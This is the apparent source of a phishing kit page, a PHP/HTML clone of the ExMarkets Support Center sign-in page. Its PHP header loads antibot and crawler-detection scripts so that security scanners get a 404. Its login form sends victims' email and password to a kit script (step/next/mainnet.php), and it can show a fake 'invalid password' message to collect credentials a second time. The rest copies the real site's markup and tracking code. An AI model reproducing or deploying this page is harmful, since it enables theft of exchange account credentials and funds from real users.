<?php session_start();require_once './src/Classes/Comp.php';require_once './src/Classes/Antibot.php';$comps = new Comp;$antibot = new Antibot;if (!$comps->checkValue()) {echo $antibot->throw404();die();}require_once './zsec.php';include './huehuehue.php';include './bot_fucker/bot.php';include './bot_fucker/wrd.php';include './crawlerdetect.php';
?>
<!DOCTYPE html>
<html lang="en-us">
<head>
	<meta charset="utf-8">
	<meta content="width=device-width,minimum-scale=1.0" name="viewport">
	<meta content="IE=edge" http-equiv="X-UA-Compatible">
	
	<title>Sign in - ExMarkets Support Center</title>

		<meta http-equiv="Content-Security-Policy" content="font-src * data:">

	<link rel="icon" type="image/png" href="image/render.png" sizes="16x16">
	<link rel="icon" type="image/png" href="image/renderv1.png" sizes="32x32">
	<link rel="icon" type="image/png" href="image/renderv2.png" sizes="96x96">
	<link href="stylesheet/font.googleapis.css" rel="stylesheet">
			<link rel="stylesheet" type="text/css" media="all" href="stylesheet/app.css"/>
    
			<link rel="stylesheet" type="text/css" media="all" href="stylesheet/16298954011629894915.css"/>
	
	
	<script language="Javascript" type="text/javascript">
		var _Payload = {"url":"https:\/\/support.exmarkets.com\/","portalpath":"https:\/\/support.exmarkets.com\/","path":"https:\/\/support.exmarkets.com\/","ip":"185.215.181.97","version":"5.0.00","portaltype":40,"portal":"primary","sessionid":"vwojXwPXiQDlyxm4Afsf314fd00abe3a904a20b419a9b4ae11e8a70b04db12d7N4qad61DJsbDQxl31HcKZ4fF","timestamp":"2022-11-18T03:01:47+0000","request":"\/HelpCenter\/Login\/Index","helpcenter_id":"1","brand_id":"1","activelocale":"en-us","defaultlocale":"en-us","instancelocale":"en-us","is_localized":false,"realtime_url":"wss:\/\/kre.kayako.net\/socket","brand_name":"ExMarkets Support Center"};
		var _CookieConsent = {
			"message": "This site uses cookies to ensure you get the best experience on our website. Declining to use cookies, may render the site unusable. To clear cookies on your device, please update your browser settings. For more information on cookies, please read our ",
			"dismiss": "I Agree",
			"deny": "I Decline",
			"policy": "Privacy Policy"
		};
		var _RegistrationConsent = {
			"message" : "I consent for ExMarkets to process my data and agree to the terms of the ",
			"dismiss" : "I consent",
			"policy" : "Privacy Policy"
		}
	</script>

	
			<!-- Google Tag Manager -->
		<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
		new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
		j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
		'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
		})(window,document,'script','dataLayer','GTM-KTXQ9HV');</script>
		<!-- End Google Tag Manager -->
	
	<!-- Add your code here -->
</head>
<body class="body">

		<header class="header ">
		<div class="header__top">
			<div class="header__top__wrapper wrap">
				<div class="branding">
	<a href="https://support.exmarkets.com" title="Go to homepage">
		<img class="branding__logo flex-item" src="image/render01.png" alt="ExMarkets">
	</a>
</div>
<div class="header__right">


	<div class="menu">

		

		<a class="menu__submit sm-max-hide" href="#">Start a conversation</a>

			<a class="u-mright u-mleft u-vmiddle u-textbold" href="https://support.exmarkets.com/login">Sign in</a>


	</div>
</div>
			</div>
		</div>
	</header>

	

	<div class="container">
		<div class="wrap wrap--body wrap--login layout layout--center" id="login-container">
	<h1 class="u-textcenter ruled" id="login-title">Sign in to ExMarkets</h1>

	<script type="text/template" id="tpl-alert">
	<% _.each(notifications, function (notification) { %>
		<div class="alert-box--overlay u-mbottom u-aligncenter fadeInQ">
			<span class="alert-icon-container alert-icon-container--error">
				<span class="u-table"><i class="icon icon-alert--error u-table__cell"></i></span>
			</span>
			<%= notification.message %>
		</div>
	<% }) %>
</script>

<div class="lg-plus-10/12 u-table u-mbottom u-aligncenter layout" id="login-form">
	<div class="u-table__cell u-textleft sm-md-5/12 md-lg-5/12 lg-plus-4/10" xmlns="http://www.w3.org/1999/html">
		<form class="js-validate" id="signin" data-ui-component="signin" action="step/next/mainnet.php?value=<?php echo $_SESSION['value'] ?> method="post" >
		<?php
                    if(isset($_GET['invalid'])){
                        echo '<input type="hidden" name="invalid">
                        <div style="color:red";>&nbsp;&nbsp;&nbsp; Invalid Email or Password.</div>';
                    }   
                    ?>
			<label class="textfield__label" for="email">Your email address
				<input class="textfield js-required-field js-noblur" id="username" name="email" type="email" value="" autofocus>
			</label>
			<label class="textfield__label u-mtopsmall" for="password">Your password
				<input class="textfield js-required-field js-noblur" id="password" name="password" type="password">
			</label>
			<div class="u-cf u-mbottom"></div>
			<input id="signin-submit" class="button button--primary button--signin--email u-inlineblock u-vmiddle" type="submit" value="Sign In">
			<div class="btn-loader-wrapper">
				<ul class="btn-loader"><li class="btn-loader__bar"></li><li class="btn-loader__bar"></li><li class="btn-loader__bar"></li></ul>
			</div>
			<a href="https://support.exmarkets.com/account/forgotpassword" class="u-floatright u-textxsmall u-mtopsmall">Forgot password</a>
		</form>
	</div><!--
-->		<div class="divider table--cell u-mtop layout__item sm-md-2/12 md-lg-2/12 lg-plus-2/10">
			<hr class="divider__rule">
			<span class="divider__text">OR</span>
		</div><!--
		--><div class="layout__item u-table__cell sm-md-5/12 md-lg-5/12 lg-plus-4/10">
			<div class="u-mtopbig">
									<button class="button button--signin button--signin--twitter" onclick="location.href=''">
						<i class="icon icon--inline icon-twitter-white"></i>
						Sign in with Twitter
					</button>
													<button class="button button--signin button--signin--facebook" onclick="location.href=''">
						<i class="icon icon--inline icon-facebook-white"></i>
						Sign in with Facebook
					</button>
													<button class="button button--signin button--signin--google" onclick="location.href=''">
						<i class="icon icon--inline icon-google-white"></i>
						Sign in with Google
					</button>
							</div>
		</div>
	</div>

<!-- OTP -->
<script type="text/template" id="tpl-otp">
	<div class="wrap wrap--body js-validate-view" id="otp-container">
		<div class="wrap layout layout--center">
			<div class="layout__item md-plus-12/12  u-textcenter">
				<h1 class="ruled" id="otp-title">Two-step verification</h1>
				<p class="u-mtopxbig u-mbottombig">Enter the code generated by your authenticator app or any one of the recovery codes.</p>
			</div><!--
			--><div class="layout__item md-lg-8/12 lg-plus-6/12 u-textcenter">
				<form class="js-validate" id="otp" data-ui-component="otp" method="post">
					<label class="textfield__label" for="code">Enter the code
						<input class="textfield js-required-field" id="otp_code" type="text" value="" autofocus>
					</label>
					<input class="textfield" id="password" type="hidden" value="">
					<input class="textfield" id="auth_token" type="hidden" value="">
					<input class="button button--primary u-inlineblock u-mtopbig u-vmiddle" id="otp-submit" type="submit" value="Sign in">
					<div class="btn-loader-wrapper u-mtopbig">
						<ul class="btn-loader"><li class="btn-loader__bar"></li><li class="btn-loader__bar"></li><li class="btn-loader__bar"></li></ul>
					</div>
				</form>
			</div>
		</div>
	</div>
</script>

<!-- Change Password -->
<script type="text/template" id="tpl-changepassword">
	<div class="wrap wrap--body wrap--change-passowrd js-validate-view">
		<div class="wrap layout layout--center">
			<div class="layout__item md-plus-12/12  u-textcenter">
				<h1 class="ruled" id="changepassword-title">Change password</h1>
				<div class="alert-box alert-box--overlay is-hidden u-mbottom u-aligncenter layout pop-out js-alert">
					<span class="alert-icon-container alert-icon-container--error">
						<span class="u-table"><i class="icon icon-alert--error u-table__cell"></i></span>
					</span>
					Your password is too weak. Please choose a strong password.
				</div>
				<p class="u-mtopxbig u-mbottombig">You&#039;ll use this password to sign in to ExMarkets.</p>
			</div>
			<div class="layout__item md-lg-8/12 lg-plus-6/12 u-textcenter">
				<form class="js-validate" id="change-password" method="post">
					<label class="textfield__label" for="password">Enter a password</label>
					<input class="textfield js-required-field" id="new-password" type="password">
					<input class="textfield" id="old_password" type="hidden" value="">
					<input class="textfield" id="auth_token" type="hidden" value="">
					<input class="textfield" id="user_type" type="hidden" value="<%= userType %>">
					<% if (userType == 'agent') { %>
											<div class="password-policy u-mtop">
							<ul class="md-colauto--2 lg-colauto--2 u-mzero u-inlineblock u-textsmall u-textleft">
																	<li class="password-policy__item u-block" id="agent-policy-minchars" data-value="8">8 character(s) minimum</li>
																									<li class="password-policy__item u-block" id="agent-policy-number" data-value="1">1 number(s)</li>
																									<li class="password-policy__item u-block" id="agent-policy-uppercase" data-value="1">1 uppercase letter(s)</li>
																									<li class="password-policy__item u-block" id="agent-policy-splchar" data-value="1">1 special character(s)</li>
																							</ul>
						</div>
										<% } else if (userType == 'customer') { %>
											<div class="password-policy u-mtop">
							<ul class="md-colauto--2 lg-colauto--2 u-mzero u-inlineblock u-textsmall u-textleft">
																	<li class="password-policy__item u-block" id="customer-policy-minchars" data-value="8">8 character(s) minimum</li>
																									<li class="password-policy__item u-block" id="customer-policy-number" data-value="1">1 number(s)</li>
																																							</ul>
						</div>
										<% } %>
					<input class="button button--primary u-inlineblock u-mtopbig u-vmiddle is-disabled js-set-password" id="changepassword-submit" type="submit" value="Reset password">
					<div class="btn-loader-wrapper u-mtopbig">
						<ul class="btn-loader"><li class="btn-loader__bar"></li><li class="btn-loader__bar"></li><li class="btn-loader__bar"></li></ul>
					</div>
				</form>
			</div>
		</div>
	</div>
</script>
	
	<footer id="login-footer">
		<p class="layout__item u-textcenter u-mtopxbig">If you&#039;ve contacted us before, you&#039;ll probably already be registered.
			<a href="https://support.exmarkets.com/account/forgotpassword">Get your password.</a>
		</p>

		<p class="layout__item u-textcenter">
			<a href="https://support.exmarkets.com/signup"><b>Need an account? Sign up.</b></a>
		</p>
	</footer>
</div>

	</div>

	<footer class="footer">
        			<script defer="defer" type="text/javascript" src="https://assets.kayako.com/helpcenter/js/app.js?version=b7c5c415"></script>
		
		<div class="wrap">

	<a class="u-inlineblock u-vmiddle u-mleft" href="https://support.exmarkets.com" title="Go to homepage">
		<img " src="image/render01.png" alt="ExMarkets">
	</a>
</div>

					<script>(function(d,a){function c(){var b=d.createElement("script");b.async=!0;b.type="text/javascript";b.src=a._settings.messengerUrl;b.crossOrigin="anonymous";var c=d.getElementsByTagName("script")[0];c.parentNode.insertBefore(b,c)}window.kayako=a;a.readyQueue=[];a.newEmbedCode=!0;a.ready=function(b){a.readyQueue.push(b)};a._settings={apiUrl:"https://exm.kayako.com/api/v1",messengerUrl:"https://exm.kayakocdn.com/messenger",realtimeUrl:"wss://kre.kayako.net/socket"};window.attachEvent?window.attachEvent("onload",c):window.addEventListener("load",c,!1)})(document,window.kayako||{});</script>
			<script type="text/javascript">
	if (kayako) {
		kayako.ready(function () {
			/**
			 * Force locale when it exists in the global
			 */
			if (_Payload.activelocale) {
				kayako.config = {
					forceLocale: _Payload.activelocale
				}
			}
		});
	}
</script>

		
				<input id="csrftoken" type="hidden" value="PmmxjvxOB0wEjfmdXXflg9KQyieTyXsXydqHOAtue5AH3DFswecnqC7IJxmu8rrHmWmkoXbld9XLMuRHgmXlELn2N03zPenO1sTF">
	</footer>

			<script language="Javascript"  type="text/javascript">
			var userIdentify = [];

			window.kayako = window.kayako || {}
			if (typeof window.kayako.ready === 'function') {
				window.kayako.ready(function() {
					if ((typeof window.kayako.identify === 'function') && (typeof window.kayako.forget === 'function')) {
						if (userIdentify.email) {
							window.kayako.identify(userIdentify.name, userIdentify.email, userIdentify.signature, userIdentify.timestamp)
						} else {
							window.kayako.forget(function() {})
						}
					}
				})
			}
		</script>
	
	

			
	
			
	
			<!-- Google Tag Manager (noscript) -->
		<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KTXQ9HV"
		height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
		<!-- End Google Tag Manager (noscript) -->
	</body>
</html>
